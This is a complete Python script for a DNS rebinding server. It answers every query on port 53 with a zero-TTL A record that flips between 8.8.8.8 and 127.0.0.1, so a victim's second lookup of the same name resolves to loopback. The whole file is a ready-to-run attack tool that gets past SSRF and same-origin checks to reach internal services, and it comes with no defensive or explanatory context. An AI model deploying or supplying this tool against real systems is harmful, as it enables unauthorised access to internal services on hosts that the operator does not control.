#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
import dnslib
import SocketServer


class DNSServer(SocketServer.UDPServer):

    def __init__(self, options):
        SocketServer.UDPServer.__init__(
            self, ('0.0.0.0', 53), RequestHandler
        )
        self.rebindStatus = False
        self.ttl = options['ttl']
        self.recordType = options['recordType']

    def getRecord(self):
        if self.rebindStatus:
            record = '127.0.0.1'
        else:
            record = '8.8.8.8'
        self.rebindStatus = not self.rebindStatus
        return record


class RequestHandler(SocketServer.DatagramRequestHandler):

    def handle(self):
        ttl = self.server.ttl
        recordType = self.server.recordType

        request = dnslib.DNSRecord.parse(self.packet).reply()
        qname = request.q.qname.__str__()
        record = self.server.getRecord()

        request.add_answer(
            dnslib.RR(
                qname,
                getattr(dnslib.QTYPE, recordType),
                rdata=getattr(dnslib, recordType)(record),
                ttl=ttl
            )
        )
        print('[%s] %s %s %s' % (time.time(), self.client_address, qname, record))
        self.wfile.write(request.pack())


def main():
    options = {
        'ttl': 0,
        'recordType': 'A'
    }
    dnsServer = DNSServer(options)
    dnsServer.serve_forever()


if __name__ == '__main__':
    main()
